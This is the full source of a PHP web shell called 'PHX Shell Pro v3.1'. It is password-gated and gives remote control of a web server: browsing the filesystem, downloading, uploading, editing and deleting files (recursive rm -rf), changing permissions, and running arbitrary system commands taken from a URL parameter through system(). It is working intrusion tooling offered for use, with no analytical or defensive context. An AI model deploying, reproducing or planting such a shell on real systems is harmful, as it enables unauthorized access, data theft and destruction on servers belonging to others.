<?php
header('Content-Type: text/html; charset=utf-8');
$password = '1qazXSW@'; // оюпнкэ рср

session_start();
if (isset($_GET['logout'])) { unset($_SESSION['auth']); header('Location: ?'); exit; }
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== $password) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) { $_SESSION['auth'] = $password; header('Location: ?'); exit; }
    die('<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;"><form method="POST" style="border:1px solid #0f0;padding:20px;background:#050505;"><h3>PHX LOGIN</h3><input type="password" name="pass" style="background:#000;color:#0f0;border:1px solid #0f0;padding:5px;" autofocus><input type="submit" value=">>" style="background:#000;color:#0f0;border:1px solid #0f0;cursor:pointer;"></form></body>');
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
@chdir($dir);
$current_dir = str_replace('\\', '/', getcwd());

// --- CHMOD ACTION ---
if (isset($_POST['new_perms'])) {
    $p = $_POST['chmod_path'];
    $m = octdec($_POST['new_perms']);
    if (@chmod($p, $m)) echo "<script>alert('Success!');</script>";
    else echo "<script>alert('Failed!');</script>";
}

// --- MULTI-ACTIONS ---
if (isset($_POST['files']) && is_array($_POST['files'])) {
    if ($_POST['action'] == 'delete') {
        foreach ($_POST['files'] as $f) {
            $path = realpath($current_dir . '/' . $f);
            is_dir($path) ? @shell_exec("rm -rf " . escapeshellarg($path)) : @unlink($path);
        }
    }
    if ($_POST['action'] == 'zip') {
        $zip_name = 'archive_' . time() . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zip_name, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['files'] as $f) {
                $path = realpath($current_dir . '/' . $f);
                if (is_file($path)) $zip->addFile($path, $f);
            }
            $zip->close();
        }
    }
}

// Single actions (Download/Delete/Upload)
if (isset($_GET['dl'])) { $file = $_GET['dl']; if (file_exists($file)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($file).'"'); readfile($file); exit; } }
if (isset($_GET['del'])) { $p = $_GET['del']; is_dir($p) ? @shell_exec("rm -rf " . escapeshellarg($p)) : @unlink($p); header('Location: ?dir='.urlencode($current_dir)); exit; }
if (isset($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], $current_dir . '/' . $_FILES['f']['name']); }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHX Shell Pro v3.1</title>
    <style>
        body { background: #080b10; color: #ccc; font-family: Tahoma, Verdana; font-size: 11px; margin: 0; padding: 0; }
        .header { background: #0d1117; padding: 10px; border-bottom: 1px solid #161b22; text-align: center; }
        .menu { background: #0d1117; padding: 5px; border-bottom: 1px solid #0f0; text-align: center; }
        .menu a { color: #0f0; text-decoration: none; padding: 0 15px; font-weight: bold; border-right: 1px solid #30363d; }
        .container { max-width: 1000px; margin: 0 auto; padding: 15px; }
        table { width: 100%; border-collapse: collapse; background: #0d1117; }
        th { color: #8bc34a; padding: 10px; border-bottom: 1px solid #30363d; font-weight: normal; text-align: center; }
        th.left { text-align: left; }
        td { padding: 8px; border-bottom: 1px solid #21262d; color: #fff; text-align: center; }
        td.left { text-align: left; }
        tr:hover { background: #161b22; }
        input, textarea, select { background: #0d1117; color: #fff; border: 1px solid #30363d; font-size: 11px; padding: 3px; }
        .btn { background: #21262d; color: #fff; border: 1px solid #30363d; cursor: pointer; padding: 3px 15px; }
        .btn:hover { border-color: #0f0; }
        a { color: #fff; text-decoration: none; }
        a:hover { color: #0f0; }
        pre { background: #000; color: #0f0; padding: 10px; border: 1px solid #30363d; white-space: pre-wrap; text-align: left; }
        .footer-box { border: 1px solid #30363d; padding: 10px; margin-top: 10px; background: #0d1117; }
    </style>
</head>
<body>

<div class="header">
    <div style="float:right; padding-right:20px;"><a href="?logout=1" style="color:red;">[ LOGOUT ]</a></div>
    <b>System:</b> <?php echo php_uname(); ?><br>
    <b>Cwd:</b> <?php 
        $parts = explode('/', trim($current_dir, '/'));
        echo '<a href="?dir=/" style="color:#0f0;">/ </a>'; $acc = '';
        foreach($parts as $p) { $acc .= '/'.$p; echo '<a href="?dir='.urlencode($acc).'" style="color:#0f0;">'.$p.'</a> / '; }
    ?>
</div>

<div class="container">
    <form method="POST">
    <div style="margin-bottom:10px; text-align: center;">
        <select name="action">
            <option value="delete">Delete Selected</option>
            <option value="zip">Zip Selected</option>
        </select>
        <input type="submit" value="Apply Action" class="btn">
    </div>

    <table>
        <thead>
            <tr>
                <th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('files[]')) c.checked=this.checked"></th>
                <th class="left">Name</th>
                <th width="80">Size</th>
                <th width="140">Modify</th>
                <th width="120">Owner/Group</th>
                <th width="60">Perms</th>
                <th width="70">Edit</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td></td>
                <td class="left"><a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">..</a></td>
                <td>dir</td><td>-</td><td>-</td><td>-</td><td>-</td>
            </tr>
            <?php
            $items = scandir($current_dir);
            foreach($items as $item) {
                if($item == "." || $item == "..") continue;
                $path = $current_dir . '/' . $item;
                $is_dir = is_dir($path);
                
                $size = $is_dir ? 'dir' : round(filesize($path)/1024, 2).' KB';
                $modify = date("Y-m-d H:i", filemtime($path));
                $owner = @posix_getpwuid(fileowner($path))['name'] ?: fileowner($path);
                $group = @posix_getgrgid(filegroup($path))['name'] ?: filegroup($path);
                $perms = substr(sprintf('%o', fileperms($path)), -4);

                echo "<tr>
                    <td><input type='checkbox' name='files[]' value='".htmlspecialchars($item)."'></td>
                    <td class='left'><a href='".($is_dir ? "?dir=".urlencode($path) : "?edit=".urlencode($path)."&dir=".urlencode($current_dir))."'>$item</a></td>
                    <td style='color:#aaa;'>$size</td>
                    <td style='color:#aaa;'>$modify</td>
                    <td style='color:#aaa;'>$owner/$group</td>
                    <td><a href='?chmod=".urlencode($path)."&dir=".urlencode($current_dir)."' style='color:#8bc34a;'>$perms</a></td>
                    <td>
                        <a href='?dl=".urlencode($path)."' style='color:#0f0;'>[G]</a> 
                        <a href='?del=".urlencode($path)."' style='color:red;'>[X]</a>
                    </td>
                </tr>";
            }
            ?>
        </tbody>
    </table>
    </form>

    <?php if(isset($_GET['chmod'])): ?>
    <div class="footer-box" style="text-align: center; border: 1px solid #8bc34a;">
        <form method="POST">
            <b>Chmod:</b> <?php echo basename($_GET['chmod']); ?> 
            <input type="text" name="new_perms" placeholder="777" size="5">
            <input type="hidden" name="chmod_path" value="<?php echo $_GET['chmod']; ?>">
            <input type="submit" value="Change" class="btn">
        </form>
    </div>
    <?php endif; ?>

    <div class="footer-box" style="text-align: center;">
        <form method="GET">
            <input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
            <b>Cmd:</b> <input type="text" name="cmd" style="width: 60%;" value="<?php echo @htmlspecialchars($_GET['cmd']); ?>">
            <input type="submit" value="Execute" class="btn">
        </form>
        <?php if(isset($_GET['cmd'])): ?><pre><?php system($_GET['cmd'].' 2>&1'); ?></pre><?php endif; ?>
    </div>

    <div class="footer-box" style="text-align: center;">
        <form method="POST" enctype="multipart/form-data">
            <b>Upload:</b> <input type="file" name="f"> <input type="submit" value="Upload" class="btn">
        </form>
    </div>
</div>

<?php if(isset($_GET['edit'])): 
    $f = $_GET['edit']; $content = htmlspecialchars(@file_get_contents($f)); ?>
    <div class="container">
        <div class="footer-box" style="border-top:2px solid #0f0;">
            <b>Editing: <?php echo basename($f); ?></b><br>
            <form method="POST">
                <textarea name="new_content" style="width:100%; height:400px; margin-top:10px;"><?php echo $content; ?></textarea>
                <input type="hidden" name="edit_path" value="<?php echo htmlspecialchars($f); ?>">
                <br><input type="submit" value="SAVE CHANGES" class="btn" style="width:100%; padding:10px; margin-top:10px;">
            </form>
        </div>
    </div>
<?php endif; ?>
<?php if(isset($_POST['new_content'])) { file_put_contents($_POST['edit_path'], $_POST['new_content']); echo "<script>location.href='?dir=".urlencode($current_dir)."';</script>"; } ?>

</body>
</html>
